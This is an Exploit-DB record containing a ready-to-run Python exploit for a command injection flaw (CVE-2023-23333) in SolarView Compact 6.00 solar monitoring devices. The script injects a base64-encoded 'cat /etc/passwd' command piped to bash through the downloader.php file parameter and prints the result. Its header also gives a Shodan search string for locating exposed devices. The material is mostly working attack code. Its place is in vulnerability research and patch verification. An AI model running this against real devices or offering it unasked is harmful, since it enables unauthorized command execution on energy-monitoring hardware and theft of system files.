{"source": "https://www.exploit-db.com/exploits/51886", "vulnName": "SolarView Compact 6.00 - Command Injection", "vulnEDBID": "51886", "vulnCVE": "2023-23333", "author": "BYTEHUNTER", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-14", "vulnContent": "#- Exploit Title: SolarView Compact 6.00 - Command Injection\n#- Shodan Dork: http.html:\"solarview compact\"\n#- Exploit Author: ByteHunter\n#- Email: 0xByteHunter@proton.me\n#- Version: 6.00\n#- Tested on: 6.00\n#- CVE : CVE-2023-23333\n\n\nimport argparse\nimport requests\n\ndef vuln_check(ip_address, port):\n    url = f\"http://{ip_address}:{port}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip\"\n    response = requests.get(url)\n    if response.status_code == 200:\n        output = response.text\n        if \"root\" in output:\n            print(\"Vulnerability detected: Command Injection possible.\")\n            print(f\"passwd file content:\\n{response.text}\")\n\n\n        else:\n            print(\"No vulnerability detected.\")\n    else:\n        print(\"Error: Unable to fetch response.\")\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"SolarView Compact Command Injection \")\n    parser.add_argument(\"-i\", \"--ip\", help=\"IP address of the target device\", required=True)\n    parser.add_argument(\"-p\", \"--port\", help=\"Port of the the target device (default: 80)\", default=80, type=int)\n    args = parser.parse_args()\n    \n    ip_address = args.ip\n    port = args.port\n    vuln_check(ip_address, port)\n\nif __name__ == \"__main__\":\n    main()\n            "}